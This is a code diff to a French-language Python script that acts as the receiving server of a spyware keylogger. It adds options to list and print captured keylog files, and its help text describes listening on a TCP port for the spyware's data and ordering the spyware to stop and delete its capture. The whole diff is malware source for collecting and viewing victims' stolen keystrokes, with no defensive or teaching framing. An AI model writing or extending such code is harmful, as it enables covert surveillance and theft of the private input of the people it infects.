@@ -1,6 +1,50 @@
 import socket
 import os
+import sys
 from datetime import datetime
+
+def show_files():
+    files = os.listdir("Keylogs")
+    if files:
+        print("Keylogs actuels :")
+        for file in files:
+            print(file)
+    else:
+        print("Pas de fichiers actuellement.")
+    sys.exit()
+
+def read_file(filename):
+    filepath = os.path.join("Keylogs", filename)
+    try:
+        with open(filepath, "r") as file:
+            content = file.read()
+            print(f"Contenu de {filename}:")
+            print(content)
+    except FileNotFoundError:
+        print(f"Le fichier {filename} n'existe pas.")
+    sys.exit()
+
+def help_option():
+    if "-h" in sys.argv or "--help" in sys.argv:
+        print("-l/--listen se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.\n"
+              "-s/--show affiche la liste des fichiers réceptionnés par le programme.\n"
+              "-r/--readfile <nom_fichier> affiche le contenu du fichier stocké sur le serveur du spyware.\n"
+              "-k/--kill arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture.")
+        sys.exit()
+
+if "-s" in sys.argv or "--show" in sys.argv:
+    show_files()
+
+if "-r" in sys.argv or "--readfile" in sys.argv:
+    try:
+        file_index = sys.argv.index("-r") if "-r" in sys.argv else sys.argv.index("--readfile")
+        filename = sys.argv[file_index + 1]
+        read_file(filename)
+    except IndexError:
+        print("Erreur: Veuillez fournir le nom du fichier à lire après l'option -r/--readfile.")
+        sys.exit()
+
+help_option()
 
 
 def receive_file(filename, client_socket, destination_folder):
